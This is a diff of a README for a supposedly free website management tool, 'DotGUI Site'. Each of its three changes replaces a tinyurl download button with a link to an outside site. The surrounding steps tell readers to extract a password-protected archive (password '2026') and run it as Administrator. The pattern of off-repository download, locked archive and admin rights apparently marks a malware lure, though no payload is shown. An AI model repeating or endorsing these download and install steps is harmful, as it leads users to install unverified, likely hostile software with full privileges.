@@ -9,7 +9,7 @@ The **🖥️ DotGUI Site** is a **free** website management and monitoring tool
 
 <div align="center">
 
-[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dotgui-site)
+[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dotgui-site)
 
 </div>
 
@@ -109,7 +109,7 @@ Managing multiple websites can be overwhelming. This free tool helps you monitor
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dotgui-site)
+[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dotgui-site)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -266,7 +266,7 @@ Manage and monitor all your websites from one dashboard for free. **DotGUI Site*
 
 <div align="center">
 
-[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dotgui-site)
+[![Download DotGUI Site](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dotgui-site)
 
 **Version 4.6.1** — Free website management tool. April 2026 update. Zero cost. No payment.
 
